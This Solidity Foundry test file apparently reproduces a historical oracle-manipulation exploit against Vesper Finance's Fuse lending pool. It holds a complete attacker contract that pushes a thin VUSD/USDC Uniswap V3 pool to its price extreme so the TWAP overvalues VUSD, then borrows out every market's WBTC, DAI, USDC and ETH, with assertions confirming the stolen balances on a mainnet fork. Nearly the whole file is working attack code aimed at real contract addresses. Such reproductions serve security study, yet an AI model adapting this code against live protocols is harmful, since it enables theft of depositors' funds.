// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.15;

import "forge-std/Test.sol";
import "../interface.sol";

interface IUniV3Pool {
    function swap(
        address recipient,
        bool zeroForOne,
        int256 amountSpecified,
        uint160 sqrtPriceLimitX96,
        bytes calldata data
    ) external returns (int256 amount0, int256 amount1);
}

interface IVesperPositionManager {
    struct MintParams {
        address token0;
        address token1;
        uint24 fee;
        int24 tickLower;
        int24 tickUpper;
        uint256 amount0Desired;
        uint256 amount1Desired;
        uint256 amount0Min;
        uint256 amount1Min;
        address recipient;
        uint256 deadline;
    }

    function mint(
        MintParams calldata params
    ) external returns (uint256 tokenId, uint128 liquidity, uint256 amount0, uint256 amount1);
}

interface IVUSDMinter {
    function mint(
        address token,
        uint256 amount,
        address recipient
    ) external;
}

interface IFuseToken {
    function mint(
        uint256 amount
    ) external returns (uint256);
    function borrow(
        uint256 amount
    ) external returns (uint256);
}

interface IFuseEther {
    function borrow(
        uint256 amount
    ) external returns (uint256);
}

interface IFuseComptroller {
    function enterMarkets(
        address[] calldata rTokens
    ) external returns (uint256[] memory);
}

contract VesperFinanceAttacker {
    uint160 private constant MAX_SQRT_RATIO_MINUS_ONE =
        1_461_446_703_485_210_103_287_273_052_203_988_822_378_723_970_341;

    IERC20 private constant WETH = IERC20(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
    IERC20 private constant USDC = IERC20(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);
    IERC20 private constant VUSD = IERC20(0x677ddbd918637E5F2c79e164D402454dE7dA8619);

    IUniV3Pool private constant WETH_USDC_POOL = IUniV3Pool(0x88e6A0c2dDD26FEEb64F039a2c41296FcB3f5640);
    IUniV3Pool private constant VUSD_USDC_POOL = IUniV3Pool(0x8dDE0A1481b4A14bC1015A5a8b260ef059E9FD89);
    IVUSDMinter private constant VUSD_MINTER = IVUSDMinter(0xb652Fc42E12828F3F1b3e96283b199E62EC570Db);
    IVesperPositionManager private constant POSITION_MANAGER =
        IVesperPositionManager(0xC36442b4a4522E871399CD717aBDD847Ab11FE88);

    IFuseToken private constant F_VUSD = IFuseToken(0x2914e8C1c2C54E5335dC9554551438c59373e807);
    IFuseToken private constant F_WBTC = IFuseToken(0x0302F55dC69F5C4327c8A6c3805c9E16fC1c3464);
    IFuseToken private constant F_DAI = IFuseToken(0x19D13B4C0574B8666e9579Da3C387D5287AF410c);
    IFuseToken private constant F_USDC = IFuseToken(0x2F251E9074E3A3575D0105586D53A92254528Fc5);
    IFuseEther private constant F_ETH = IFuseEther(0x258592543a2D018E5BdD3bd74D422f952D4B3C1b);
    IFuseComptroller private constant COMPTROLLER = IFuseComptroller(0xF53c73332459b0dBd14d8E073319E585f7a46434);

    IERC20 private constant WBTC = IERC20(0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599);
    IERC20 private constant DAI = IERC20(0x6B175474E89094C44Da98b954EedeAC495271d0F);

    function manipulateOracle() external payable {
        WETH9(address(WETH)).deposit{value: msg.value}();

        WETH_USDC_POOL.swap(
            address(this), false, int256(msg.value), MAX_SQRT_RATIO_MINUS_ONE, abi.encode(address(WETH))
        );

        USDC.approve(address(VUSD_MINTER), type(uint256).max);
        VUSD_MINTER.mint(address(USDC), 1e6, address(this));

        USDC.approve(address(POSITION_MANAGER), type(uint256).max);
        VUSD.approve(address(POSITION_MANAGER), type(uint256).max);
        POSITION_MANAGER.mint(
            IVesperPositionManager.MintParams({
                token0: address(VUSD),
                token1: address(USDC),
                fee: 500,
                tickLower: -887_260,
                tickUpper: -887_250,
                amount0Desired: 0,
                amount1Desired: 100_000,
                amount0Min: 0,
                amount1Min: 0,
                recipient: address(this),
                deadline: block.timestamp
            })
        );

        VUSD_USDC_POOL.swap(
            address(this),
            false,
            int256(USDC.balanceOf(address(this))),
            MAX_SQRT_RATIO_MINUS_ONE,
            abi.encode(address(USDC))
        );
    }

    function drainFuse() external {
        VUSD.approve(address(F_VUSD), type(uint256).max);
        require(F_VUSD.mint(VUSD.balanceOf(address(this))) == 0, "collateral mint failed");

        address[] memory collateralMarkets = new address[](1);
        collateralMarkets[0] = address(F_VUSD);
        COMPTROLLER.enterMarkets(collateralMarkets);

        require(F_WBTC.borrow(WBTC.balanceOf(address(F_WBTC))) == 0, "WBTC borrow failed");
        require(F_DAI.borrow(DAI.balanceOf(address(F_DAI))) == 0, "DAI borrow failed");
        require(F_USDC.borrow(USDC.balanceOf(address(F_USDC))) == 0, "USDC borrow failed");
        require(F_ETH.borrow(address(F_ETH).balance) == 0, "ETH borrow failed");
    }

    function uniswapV3SwapCallback(
        int256 amount0Delta,
        int256 amount1Delta,
        bytes calldata data
    ) external {
        require(msg.sender == address(WETH_USDC_POOL) || msg.sender == address(VUSD_USDC_POOL), "invalid callback");
        IERC20 tokenToPay = IERC20(abi.decode(data, (address)));
        uint256 amountToPay = amount0Delta > 0 ? uint256(amount0Delta) : uint256(amount1Delta);
        tokenToPay.transfer(msg.sender, amountToPay);
    }

    receive() external payable {}
}

contract VesperFinanceExploitTest is Test {
    IERC20 private constant WBTC = IERC20(0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599);
    IERC20 private constant DAI = IERC20(0x6B175474E89094C44Da98b954EedeAC495271d0F);

    function testExploit() public {
        vm.createSelectFork("https://eth.drpc.org", 13_537_921);
        VesperFinanceAttacker attacker = new VesperFinanceAttacker();
        vm.deal(address(attacker), 57 ether);

        attacker.manipulateOracle{value: 56_818_181_818_181_818_181}();

        // The vulnerable oracle uses a 10-minute VUSD/USDC Uniswap V3 TWAP.
        // A short period at the maximum tick is enough to massively overvalue VUSD.
        vm.warp(block.timestamp + 174);
        vm.roll(block.number + 12);
        attacker.drainFuse();

        assertGt(WBTC.balanceOf(address(attacker)), 13e8);
        assertGt(DAI.balanceOf(address(attacker)), 670_000 ether);
        assertGt(address(attacker).balance, 40 ether);
    }
}
